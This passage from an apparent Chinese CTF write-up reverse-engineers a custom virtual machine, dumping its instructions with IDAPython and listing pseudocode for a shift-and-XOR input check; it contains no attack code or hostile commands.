buf[a]</code></td></tr><tr><td style="text-align:center">0x2E</td><td style="text-align:center">终止 CPU 运行，即 hlt 指令</td></tr><tr><td style="text-align:center">0x2F</td><td style="text-align:center">输出 flag 正确提示</td></tr><tr><td style="text-align:center">0x30</td><td style="text-align:center">输出 flag 错误提示</td></tr></tbody></table><p>根据上面的分析，用 IDAPython 把虚拟机指令 dump 下来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">0x0F48</span>, <span class="number">0x11E0</span>, <span class="number">12</span>):</span><br><span class="line">    ins = Dword(addr)</span><br><span class="line">    op1 = Dword(addr + <span class="number">4</span>)</span><br><span class="line">    op2 = Dword(addr + <span class="number">8</span>)</span><br><span class="line">    code.append(ins)</span><br><span class="line">    code.append(op1)</span><br><span class="line">    code.append(op2)</span><br><span class="line"><span class="keyword">print</span> code</span><br></pre></td></tr></table></figure><p>然后用脚本处理一下，得到伪代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br></pre></td><td class="code"><pre><span class="line">buf[<span class="number">0</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] ^= buf[<span class="number">1</span>]</span><br><span class="line">code[buf[<span class="number">1</span>]] = buf[<span class="number">1</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '129')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '129')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '130')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '130')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '131')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '131')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '132')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '132')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '133')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '133')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '134')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '134')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '135')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '135')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '136')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '136')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">2</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '137')</span></span><br><span class="line">buf[<span class="number">3</span>] = buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">8</span></span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] &lt;&lt;= (buf[<span class="number">4</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">3</span>] ^= buf[<span class="number">3</span>]</span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">3</span>]] <span class="comment"># 0</span></span><br><span class="line">code[buf[<span class="number">3</span>]] = buf[<span class="number">2</span>] <span class="comment"># 0</span></span><br><span class="line">buf[<span class="number">2</span>] ^= buf[<span class="number">4</span>]</span><br><span class="line">code[buf[<span class="number">0</span>]] = buf[<span class="number">2</span>] <span class="comment"># ('Write code, offset:', '137')</span></span><br><span class="line">buf[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">buf[<span class="number">0</span>] += buf[<span class="number">1</span>]</span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] -= buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">1</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">2</span>] <span class="comment"># jmp 9</span></span><br><span class="line">buf[<span class="number">0</span>] = <span class="number">129</span></span><br><span class="line">buf[<span class="number">1</span>] = buf[<span class="number">0</span>]</span><br><span class="line">buf[<span class="number">2</span>] = <span class="number">9</span></span><br><span class="line">buf[<span class="number">1</span>] += buf[<span class="number">2</span>]</span><br><span class="line">buf[<span class="number">3</span>] = code[buf[<span class="number">0</span>]] <span class="comment"># ('Read code, offset:', '129')</span></span><br><span class="line">buf[<span class="number">4</span>] = code[buf[<span class="number">1</span>]] <span class="comment"># ('Read code, offset:', '138')</span></span><br><span class="line">buf[<span class="number">3</span>] -= buf[<span class="number">4</span>]</span><br><span class="line">buf[<span class="number">4</span>] = <span class="number">126</span></span><br><span class="line"><span class="keyword">if</span> buf[<span class="number">3</span>] != <span class="number">0</span>:</span><br><span class="line">pc = buf[<span class="number">4</span>] <span class="comment"># jmp 126</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'wrong'</span></span><br></pre></td></tr></table></figure><p>上面是在 <code>buf[3] != 0</code> 的时候，输出 wrong 的情况，如果在这个条件判断中都正确的话，会产生以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 